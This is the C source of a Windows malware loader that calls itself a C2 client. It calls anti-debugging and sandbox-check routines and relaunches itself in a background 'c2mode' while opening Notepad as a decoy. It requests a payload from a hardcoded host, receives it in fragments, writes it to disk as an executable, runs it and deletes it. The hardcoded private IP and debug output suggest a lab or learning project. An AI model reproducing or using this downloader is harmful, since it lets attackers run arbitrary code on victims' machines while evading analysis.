#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ws2tcpip.h>
#include "antidebug.h"
#include "checksandbox.h"

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024
#define MAX_FRAGMENTS 1000
#define PORT 8080
#define DEVICE_B_IP "192.168.116.129"

// Your get_local_ip function
char* get_local_ip() {
    static char ip[INET_ADDRSTRLEN];
    
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        fprintf(stderr, "Error getting hostname\n");
        return "127.0.0.1";
    }
    
    struct addrinfo hints, *result = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(hostname, NULL, &hints, &result) != 0) {
        fprintf(stderr, "Error getting address info\n");
        return "127.0.0.1";
    }
    
    for (struct addrinfo *ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        struct sockaddr_in *addr = (struct sockaddr_in *)ptr->ai_addr;
        if (inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN) != NULL &&
            strncmp(ip, "127.", 4) != 0) {
            freeaddrinfo(result);
            return ip;
        }
    }
    
    freeaddrinfo(result);
    return "127.0.0.1";
}

// Function that runs the C2 client code - EXACT copy of test.c main()
void run_c2_client() {
    InitAntiDebug(); // init antidebugging module
    
    SOCKET sock, server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr, listen_addr;
    int addr_len = sizeof(struct sockaddr_in);
    char buffer[BUFFER_SIZE];
    char *local_ip;
    char request[BUFFER_SIZE];
    char *fragments[MAX_FRAGMENTS];
    int fragment_sizes[MAX_FRAGMENTS];
    int num_fragments = 0;
    int total_size = 0;
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return;
    }
    
    // Get the local IP address
    local_ip = get_local_ip();
    if (!local_ip) {
        fprintf(stderr, "Failed to get local IP address\n");
        WSACleanup();
        return;
    }
    //printf("Device A IP: %s\n", local_ip);
    
    //printf("Using Device B IP address: %s\n", DEVICE_B_IP);
    
    // Create socket for sending request
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        fprintf(stderr, "Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    
    if (inet_pton(AF_INET, DEVICE_B_IP, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Invalid address\n");
        closesocket(sock);
        WSACleanup();
        return;
    }
    
    // Connect to Device B
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }
    
    // Send request with our IP
    snprintf(request, BUFFER_SIZE, "REQUEST_PAYLOAD %s", local_ip);
    send(sock, request, (int)strlen(request), 0);
    printf("Request sent to Device B (%s)\n", DEVICE_B_IP);
    
    // Close initial socket
    closesocket(sock);
    
    // Create socket for receiving fragments
    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        fprintf(stderr, "Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }
    
    BOOL opt = TRUE;
    if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) < 0) {
        fprintf(stderr, "Setsockopt failed: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return;
    }
    
    memset(&listen_addr, 0, sizeof(listen_addr));
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_addr.s_addr = INADDR_ANY;
    listen_addr.sin_port = htons(PORT + 1);
    
    if (bind(server_sock, (struct sockaddr *)&listen_addr, sizeof(listen_addr)) < 0) {
        fprintf(stderr, "Bind failed: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return;
    }
    
    if (listen(server_sock, 5) < 0) {
        fprintf(stderr, "Listen failed: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return;
    }
    
    printf("Listening for fragments on port %d...\n", PORT + 1);
    
    // Accept connection from Device B
    if ((client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len)) == INVALID_SOCKET) {
        fprintf(stderr, "Accept failed: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return;
    }
    
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
    printf("Connection from %s\n", client_ip);
    
    // Receive fragments
    while (1) {
        int bytes_received = recv(client_sock, buffer, BUFFER_SIZE, 0);
        
        if (bytes_received <= 0) {
            break;
        }
        
        if (strncmp(buffer, "END_OF_TRANSMISSION", 19) == 0) {
            printf("End of transmission received\n");
            break;
        }
        
        fragments[num_fragments] = (char*)malloc(bytes_received);
        if (!fragments[num_fragments]) {
            fprintf(stderr, "Memory allocation failed\n");
            break;
        }
        
        memcpy(fragments[num_fragments], buffer, bytes_received);
        fragment_sizes[num_fragments] = bytes_received;
        total_size += bytes_received;
        
        printf("Received fragment %d of size %d bytes\n", num_fragments + 1, bytes_received);
        
        num_fragments++;
        if (num_fragments >= MAX_FRAGMENTS) {
            printf("Maximum number of fragments reached\n");
            break;
        }
    }
    
    // Combine fragments
    char *complete_payload = (char*)malloc(total_size + 1);
    if (!complete_payload) {
        fprintf(stderr, "Memory allocation for complete payload failed\n");
    } else {
        int offset = 0;
        for (int i = 0; i < num_fragments; i++) {
            memcpy(complete_payload + offset, fragments[i], fragment_sizes[i]);
            offset += fragment_sizes[i];
        }
        complete_payload[total_size] = '\0';
        
        printf("Complete payload received: %d bytes total\n", total_size);
        printf("Payload preview: %.100s%s\n", complete_payload, 
               (total_size > 100) ? "..." : "");
        
        // Write and execute the payload
        FILE *exe_file = fopen("received.exe", "wb");
        if (exe_file) {
            fwrite(complete_payload, 1, total_size, exe_file);
            fclose(exe_file);
            printf("Executable written to received.exe\n");
            
            printf("Executing payload...\n");
            STARTUPINFO si = {sizeof(si)};
            PROCESS_INFORMATION pi;
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_SHOW;
            
            CreateProcess(
                "received.exe",
                NULL, NULL, NULL, FALSE,
                0, NULL, NULL, &si, &pi
            );

            if (pi.hProcess) {
                printf("Waiting for process to complete...\n");
                
                // Wait for the process to finish (INFINITE means wait forever)
                WaitForSingleObject(pi.hProcess, INFINITE);
                
                printf("Process completed\n");
                
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                
                // Small delay to ensure file handle is fully released
                Sleep(3000);
                
                // Now delete the executable
                if (remove("received.exe") == 0) {
                    printf("Executable deleted successfully\n");
                } else {
                    fprintf(stderr, "Failed to delete executable\n");
                }
            } else {
                fprintf(stderr, "Failed to create process\n");
            }
        } else {
            fprintf(stderr, "Failed to write executable file\n");
        }
        free(complete_payload);
    }
    
    // Clean up
    for (int i = 0; i < num_fragments; i++) {
        free(fragments[i]);
    }
    closesocket(client_sock);
    closesocket(server_sock);
    WSACleanup();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Check if we're running as the C2 client subprocess
    if (lpCmdLine && strstr(lpCmdLine, "c2mode") != NULL) {
        // Allocate a console to see printf output
        AllocConsole();
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
        
        // We are in C2 mode - run the C2 client
        run_c2_client();
        
        printf("Press Enter to exit...\n");
        getchar();
        return 0;
    }
    
    // Main launcher mode - spawn both processes
    
    // 1. Start ourselves again in C2 mode (detached background process)
    STARTUPINFO si_c2 = {sizeof(si_c2)};
    PROCESS_INFORMATION pi_c2;
    // Show the console window to see debug output
    si_c2.dwFlags = STARTF_USESHOWWINDOW;
    si_c2.wShowWindow = SW_SHOW;  // Change to SW_SHOW to see it working
    
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    
    char cmdLine[MAX_PATH + 20];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" c2mode", exePath);
    
    if (CreateProcess(
        NULL,
        cmdLine,
        NULL, NULL, FALSE,
        0,  // Remove CREATE_NO_WINDOW to see console
        NULL, NULL,
        &si_c2, &pi_c2
    )) {
        CloseHandle(pi_c2.hProcess);
        CloseHandle(pi_c2.hThread);
    }
    
    // 2. Launch notepad immediately
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    CreateProcess(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        0, NULL, NULL, &si, &pi
    );
    
    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return 0;
}